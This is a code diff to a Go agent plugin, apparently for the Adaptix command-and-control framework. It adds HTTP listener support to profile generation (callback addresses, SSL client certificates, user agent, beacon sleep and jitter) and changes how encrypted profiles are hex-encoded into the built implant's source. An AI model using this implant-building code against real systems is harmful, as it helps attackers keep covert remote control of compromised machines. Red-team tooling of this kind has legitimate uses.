@@ -347,6 +347,74 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 			}
 			profileData, _ = msgpack.Marshal(profile)
 
+		case "http":
+			uri, _ := listenerMap["uri"].(string)
+			userAgent, _ := listenerMap["user_agent"].(string)
+			headerName := ""
+			if val, ok := listenerMap["hb_header"].(string); ok {
+				headerName = val
+			}
+
+			servers, _ := listenerMap["callback_addresses"].(string)
+			servers = strings.ReplaceAll(servers, " ", "")
+			servers = strings.ReplaceAll(servers, "\n", ",")
+			servers = strings.TrimSuffix(servers, ",")
+			addresses := strings.Split(servers, ",")
+
+			var sslKey []byte
+			var sslCert []byte
+			var caCert []byte
+			Ssl, _ := listenerMap["ssl"].(bool)
+			if Ssl {
+				ssl_key, _ := listenerMap["client_key"].(string)
+				sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
+				if err != nil {
+					return nil, err
+				}
+
+				ssl_cert, _ := listenerMap["client_cert"].(string)
+				sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
+				if err != nil {
+					return nil, err
+				}
+
+				ca_cert, _ := listenerMap["ca_cert"].(string)
+				caCert, err = base64.StdEncoding.DecodeString(ca_cert)
+				if err != nil {
+					return nil, err
+				}
+			}
+
+			// Dynamic Sleep/Jitter parsing
+			sleepVal, _ := listenerMap["sleep"].(float64)
+			if sleepVal <= 0 {
+				sleepVal = 5 // Default 5s
+			}
+
+			jitterVal, _ := listenerMap["jitter"].(float64)
+			if jitterVal < 0 {
+				jitterVal = 0 // Default 0%
+			} else if jitterVal > 90 {
+				jitterVal = 90 // Cap at 90%
+			}
+
+			profile := Profile{
+				Type:        uint(agentWatermark),
+				Addresses:   addresses,
+				ConnTimeout: reconnectTimeout,
+				ConnCount:   generateConfig.ReconnectCount,
+				UseSSL:      Ssl,
+				SslCert:     sslCert,
+				SslKey:      sslKey,
+				CaCert:      caCert,
+				Uri:         uri,
+				UserAgent:   userAgent,
+				Sleep:       int(sleepVal),
+				Jitter:      int(jitterVal),
+				HeaderName:  headerName,
+			}
+			profileData, _ = msgpack.Marshal(profile)
+
 		default:
 			return nil, errors.New("protocol unknown")
 		}
@@ -355,13 +423,11 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 		profileData, _ = extHandler.Encrypt(profileData, encryptKey)
 		profileData = append(encryptKey, profileData...)
 
-		profileString := ""
-		for _, b := range profileData {
-			profileString += fmt.Sprintf("\\x%02x", b)
-		}
+		// Use Hex encoding to avoid any escaping issues in generated Go code
+		profileString := hex.EncodeToString(profileData)
 		agentProfiles = append(agentProfiles, []byte(profileString))
 
-		fmt.Println(profileString)
+		fmt.Println("Profile Hex Len:", len(profileString))
 
 		/// END CODE HERE
 	}
@@ -422,9 +488,10 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s/%s, Output: %s", GoOs, GoArch, Filename))
 
-	config := "package main\n\nvar encProfiles = [][]byte{\n"
+	// Changed: agentProfiles now contains Hex strings
+	config := "package main\n\nvar encProfiles = []string{\n"
 	for _, profile := range agentProfiles {
-		config += fmt.Sprintf("    []byte(\"%s\"),\n", profile)
+		config += fmt.Sprintf("    \"%s\",\n", string(profile))
 	}
 	config += "}\n"
 
